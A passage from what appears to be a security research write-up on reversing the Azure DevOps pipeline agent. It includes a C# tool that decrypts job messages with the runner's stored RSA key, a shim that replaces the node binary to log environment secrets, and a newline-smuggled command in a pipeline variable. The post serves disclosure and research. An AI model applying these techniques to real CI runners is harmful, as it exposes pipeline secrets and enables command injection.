Fantastic. `~/myagent/.credentials_rsaparams` contains our master key data.
  
  
  :~/myagent$ cat .credentials_rsaparams 
  {
  "d": "hpDGZduQoEfrC6g...redacted...",
  "dp": "QErr1c6j4k5OLg...redacted...",
  "dq": "tj1v+bh3rfG9gT...redacted...",
  "exponent": "AQAB",
  "inverseQ": "HZwkVPbk...redacted...",
  "modulus": "v20yGnBZa...redacted...",
  "p": "/nD50+M173Y8yj0...redacted...",
  "q": "wJll1O+kNu2JSL7...redacted..."
  }
  

Now we need to find the session key. Looking back at the HTTP proxy logs and searching for ‘encryption’ in the responses comes up with a `POST /sanaopulsetesting/_apis/distributedtask/pools/12/sessions` that has the following in the JSON body:
  
  
  "encryptionKey":{"encrypted":true,"value":"Sv31b3Qi2yqtmV/QMuyrmNs6uTjlP0fS+7Xs0S/XeeLxOA8jGHpnvyYWgfeH9HClYpixs13uHJdYHM7+0NeF7yas1BeDKinzP/6IXUZssXKUUiWs8L0sGrc3LEwWvmqsYbK0sYrymdhczh5HeHUeBGV/J/eUx5+d34xNirYckcefMjERuqTKSMq+0LzNlETzN5JlxqdHOx1+IXJG4P1c7kNI1SLez85b3hSJA4n059zoXziWqzNGV47EgR8aF46wFdSFx8cz0KlxKiYoTrpaBAzMDLaginALOe20cskHUMSQaVVw8btd+fULryxqkmwnq94XB5uxO2J16hqZmBz1fQ=="},"ownerNam...yoink...
  

What does the above tell us? The job message encryption key is set per session. That job message encryption key is decrypted using the master key. The master key is stored on the runner file-system. We can now write a decryptor:
  
  
  using System.Security.Cryptography;
  using System.Text;
  using Newtonsoft.Json;
  
  namespace deeecryptor;
  
  class Program
  {
  private static RSAParameters LoadParameters(String _keyFile)
  {  
  string encryptedBytes = File.ReadAllText(_keyFile);
  return JsonConvert.DeserializeObject<RSAParameters>(encryptedBytes);
  }
  
  static void Main(string[] args)
  {
  if(args.Length < 4){
  Console.Error.WriteLine("Please run with: dotnet run <rsaparams path> <encryption key> <iv> <file with base64ed encrypted blob>");
  return;
  }
  
  byte[] _encryptionKey = Convert.FromBase64String(args[1]);
  byte[] _iv = Convert.FromBase64String(args[2]);
  
  Console.Error.WriteLine("Loading RSA key parameters from file {0}", args[0]);
  RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
  
  RSAParameters rsaParameters = LoadParameters(args[0]);
  
  rSACryptoServiceProvider.ImportParameters(rsaParameters);
  Console.Error.WriteLine("[+] RSA loaded");
  
  Aes aes = Aes.Create();
  ICryptoTransform decryptor = aes.CreateDecryptor(rSACryptoServiceProvider.Decrypt(_encryptionKey, RSAEncryptionPadding.OaepSHA1), _iv);
  Console.Error.WriteLine("[+] Key/IV loaded");
  
  Console.Error.WriteLine("[+] Reading ciphertext from {0}", args[3]);
  string encryptedBytes = File.ReadAllText(args[3]);
  
  using MemoryStream body = new MemoryStream(Convert.FromBase64String(encryptedBytes));
  using CryptoStream cryptoStream = new CryptoStream(body, decryptor, CryptoStreamMode.Read);
  using StreamReader bodyReader = new StreamReader(cryptoStream, Encoding.UTF8);
  Console.WriteLine(bodyReader.ReadToEnd());
  
  Console.Error.WriteLine("[+] Done");
  }
  }
  

Passing the relevant info into the decryptor above, we can get the decrypted job JSON. The parameters are the path to the `rsaparams` file, the encryption key and IV from the `session` API request (which gives us our per-session key), and a file containing the base64 blob from the `PipelineAgentJobRequest` message.
  
  
  ~/src/deeecryptor$ dotnet run ~/myagent/.credentials_rsaparams QlZXHYF/qT7oG4VX5oGNX0DlGc4lAQdD7OCXOxOYd47f6HOJ9fA9Brw4BC9l9VEn8OyhGA8gEQqrMBTUaDualfkJ/27r3/qnnVGql/Ddg1elKKwFFrkaVae3LhxI43y7tZSE68UyQgSyEvqCpUA0voPO/nZkOz7jkRRvCsvKx9hp6cJ7pq3ZNLWSIvTO2dcsXTFtzthutRzdnFY7byFfe9tjbmsgtwEKqAqgBQkX9z/azANFknpRIMIBACkLLA3VRVHtsu/WYugs2+pcPVaePkK1WRdFnqvy1AdeXsnVWr5zkB7BlXkbSbylCYw5b7VqJL9DEy31J8A0MDXJrtC1RA== ADGuunZLhcw7WeZAH021Ew== PipelineAgentJobRequest_body.b64 > plaintextjob.json
  Loading RSA key parameters from file /home/user/myagent/.credentials_rsaparams
  [+] RSA loaded
  [+] Key/IV loaded
  [+] Reading ciphertext from PipelineAgentJobRequest_body.b64
  [+] Done
  ~/src/deeecryptor$ jq . < plaintextjob.json 
  {
  "mask": [
  {
  "type": "regex",
  "value": "Ol7sWrlu65Cxq8j7j7SL5\\+v7c7BAAV7w1BAQTpzUd1bFFxKCLfRKmA=="
  },
  {
  "type": "regex",
  ...yoink...
  "steps": [
  {
  "inputs": {
  "repository": "self",
  "fetchDepth": "1"
  },
  "type": "task",
  "reference": {
  "id": "6d15af64-176c-496d-b583-fd2ae21d4df4",
  "name": "Checkout",
  "version": "1.0.0"
  },
  "id": "63e8042a-f367-5aec-692c-fcc654be55e4",
  "name": "__system_1",
  "displayName": "Checkout"
  },
  {
  "inputs": {
  "script": "echo Add other tasks to build, test, and deploy your project.\necho See https://aka.ms/yaml\necho $(can_i_inject_into_template)\nsleep 10\n"
  },
  "type": "task",
  ...yoink...
  "variables": {
  "system.debug": {
  "value": "True",
  "isReadOnly": true
  },
  "agent.diagnostic": {
  "value": "True",
  "isReadOnly": true
  },
  "one": {
  "value": "initialValue"
  },
  "templateinjection": {
  "value": "testtesttest \n\n echo hi"
  },
  ...yoink...
  "system.accessToken": {
  "value": "eyJ0eXAiOi...redacted...23VA",
  "isSecret": true
  },
  "agent.retainDefaultEncoding": {
  "value": "false",
  "isReadOnly": true
  },
  ...yoink...
  

We’ve successfully decrypted out the job configuration and confirmed that the body inside the `PipelineAgentJobRequest` contains all our definitions, steps and variables for the job that’s being executed.

Why is this important? Well, we can see that the parameter and variable replacement strings are included in the input (`echo $(can_i_inject_into_template)`), so we know that the runner code is responsible for variable substitution handling. We can also see the `isReadOnly` and `isSecret` booleans, which we can search for in the runner code base to better understand how variables are being handled.

## Figuring out parameter passing

There was some dynamic analysis used to figure out the parameter passing; debugging the remote Azure runner and stepping through what’s going on in dotnet land. This is going to be detailed in another article this May. You can see some of this in the Advisory section of this article (above).

There is another way to figure out how parameters are handled, and why we cant get `secret` parameters out directly via an `env` call in the pipeline. The `Agent.Listener` talks to the server and polls for jobs, when it gets one it spawns `Agent.Worker`, which subsequently runs `NodeJS`, which then writes a script file out and executes it with bash. We can see this from looking at the `ps` output in the Initial Analysis section.

The node code is based on [the azure-pipelines-task-lib](https://github.com/microsoft/azure-pipelines-task-lib). Reading through this we can figure out that it’s expecting parameters passed via environment variables, and it scrubs secrets from its environment after it processes them. We can tweak the `node` binary in the runner installation directory to log its environment, which should give us some insights on whether the pipeline variable replacement logic is before, or after the node step. We can achieve this by replacing the node binary in the runner installation directory with a shell script that will log the environment:
  
  
  $ cat externals/node16/bin/node
  #!/bin/bash
  echo "logging environment" >>  /dev/shm/$(date +%s).log
  env >> /dev/shm/$(date +%s).log
  /home/user/myagent/externals/node16/bin/node2 "$@"
  

We then trigger a pipeline, and see what’s in the log file:
  
  
  logging environment
  NEW-TEST-VARIABLE=echo hi
  REFERING-TO-KV-SECRET=changed-for-testing-purposes-aa
  SECRET_CAN-I-INJECT-INTO-TEMPLATE-SECRET=testesttest
  agent.jobstatus=Succeeded
  SHELL=/bin/bash
  SESSION_MANAGER=local/ubuntu-devoops:@/tmp/.ICE-unix/2061,unix/ubuntu-devoops:/tmp/.ICE-unix/2061
  WINDOWID=44040195
  ...yoink...
  SYSTEM_TOTALJOBSINPHASE=1
  INPUT_SCRIPT=echo Add other tasks to build, test, and deploy your project.
  echo See https://aka.ms/yaml
  echo testtest
  echo testesttest
  sleep 10
  

The variable replacement (`testtest` and `testesttest`) has already happened. Note the use of `SECRET_` for passing things to node, this is due to how the `azure-pipelines-task-lib` is put together. It expects to have everything passed to it via environment variables, then it will scrub secrets from the environment after they’re loaded. See https://github.com/microsoft/azure-pipelines-task-lib/blob/releases/4.x/node/internal.ts#L696.

At this point we know that `Agent.Worker` is likely responsible for handling the string replacement, as the substitution has already happened by the time NodeJS is involved, but the string replacement did not happen prior to receiving the job JSON from the DevOps server.

After a bunch more reversing, and some dynamic analysis, we find the method responsible for the string replacement - `Microsoft.VisualStudio.Services.Agent.Util.VarUtil.ExpandValues(IHostContext context, IDictionary<string, string> source, IDictionary<string, string> target)`. The variables and secrets and so forth are passed in a key/value dictionary in source, and the script contents are in the `target` dictionary.
  
  
  public static void ExpandValues(IHostContext context, IDictionary<string, string> source, IDictionary<string, string> target)
  {
  ArgUtil.NotNull(context, "context");
  ArgUtil.NotNull(source, "source");
  Tracing trace = context.GetTrace("VarUtil");
  trace.Entering("ExpandValues");
  target = target ?? new Dictionary<string, string>();
  string[] array = target.Keys.ToArray();
  foreach (string targetKey in array)
  {
  trace.Verbose("Processing expansion for: '" + targetKey + "'");
  int startIndex = 0;
  string targetValue = target[targetKey] ?? string.Empty;
  int prefixIndex;
  int suffixIndex;
  while (startIndex < targetValue.Length && (prefixIndex = targetValue.IndexOf(Constants.Variables.MacroPrefix, startIndex, StringComparison.Ordinal)) >= 0 && (suffixIndex = targetValue.IndexOf(Constants.Variables.MacroSuffix, prefixIndex + Constants.Variables.MacroPrefix.Length, StringComparison.Ordinal)) >= 0)
  {
  string variableKey = targetValue.Substring(prefixIndex + Constants.Variables.MacroPrefix.Length, suffixIndex - prefixIndex - Constants.Variables.MacroPrefix.Length);
  trace.Verbose("Found macro candidate: '" + variableKey + "'");
  if (!string.IsNullOrEmpty(variableKey) && TryGetValue(trace, source, variableKey, out var variableValue))
  {
  trace.Verbose("Macro found.");
  targetValue = targetValue.Substring(0, prefixIndex) + (variableValue ?? string.Empty) + targetValue.Substring(suffixIndex + Constants.Variables.MacroSuffix.Length);
  startIndex = prefixIndex + (variableValue ?? string.Empty).Length;
  }
  else
  {
  trace.Verbose("Macro not found.");
  startIndex = prefixIndex + 1;
  }
  }
  target[targetKey] = targetValue ?? string.Empty;
  }
  }
  
  private static bool TryGetValue(Tracing trace, IDictionary<string, string> source, string name, out string val)
  {
  if (source.TryGetValue(name, out val))
  {
  val = val ?? string.Empty;
  trace.Verbose("Get '" + name + "': '" + val + "'");
  return true;
  }
  val = null;
  trace.Verbose("Get '" + name + "' (not found)");
  return false;
  }
  

`ExpandValues` is doing a substring replacement, and contains no filtering. The root cause here is missing input validation and/or output scrubbing. No where in the chain between the Azure DevOps server and the inevitable writing of the bash script file are dangerous characters, such as shell injection characters, sufficiently escaped.

# Now what?

A product this complex has a code base just as complex. In the case of Azure DevOps, it’s built upon the products which have come before; TFS, Visual Studio Team Services, Visual Studio Online. The code base is like layers of code archaeology in certain sections. The software hasn’t so much grown as it has evolved, with vestigial parts and legacy code. The attack surface is huge and there are many moving parts from so many complex systems interacting. Not just YAML pipelines, but classic pipelines and boards and repositories and third party integrations and APIs and front ends. Between all of those products and permutations of interactions, there is so much room for future research. We looked at decompiling and reversing the Azure DevOps Agent specifically, but you can also download the Azure DevOps on-prem server and start the same research process there, if you were so inclined.

The harder something is to explore and understand, the more bugs don’t get found. By releasing our reversing steps we hope to lower the barrier to entry and lower the fruit a bit for everyone.

* * *

_Follow us on[LinkedIn](https://nz.linkedin.com/company/pulsesecurity)_

* * *
